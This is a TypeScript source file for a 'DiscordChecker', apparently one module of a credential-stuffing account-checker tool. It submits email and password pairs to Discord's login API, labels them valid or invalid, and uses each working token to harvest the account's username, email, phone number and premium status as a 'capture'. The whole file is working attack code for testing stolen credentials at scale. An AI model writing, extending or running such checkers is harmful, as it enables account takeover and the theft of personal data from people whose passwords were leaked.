import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class DiscordChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Discord login endpoint
      const loginResponse = await this.client.post(
        'https://discord.com/api/v9/auth/login',
        {
          login: email,
          password: password,
          undelete: false,
        }
      );

      if (loginResponse.data?.token) {
        // Get account details
        const capture = await this.getAccountDetails(loginResponse.data.token);
        
        return this.createResult(email, password, 'discord', 'valid', capture);
      }

      if (loginResponse.data?.mfa) {
        return this.createResult(email, password, 'discord', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.createResult(email, password, 'discord', 'invalid');
    } catch (error: any) {
      return this.createResult(
        email,
        password,
        'discord',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(token: string) {
    try {
      const response = await this.client.get(
        'https://discord.com/api/v9/users/@me',
        {
          headers: {
            Authorization: token,
          },
        }
      );

      return {
        username: response.data?.username,
        email: response.data?.email,
        emailVerified: response.data?.verified,
        phoneNumber: response.data?.phone,
        createdDate: response.data?.id 
          ? new Date((parseInt(response.data.id) / 4194304) + 1420070400000).toISOString()
          : undefined,
        isPremium: response.data?.premium_type > 0,
      };
    } catch {
      return {};
    }
  }
}
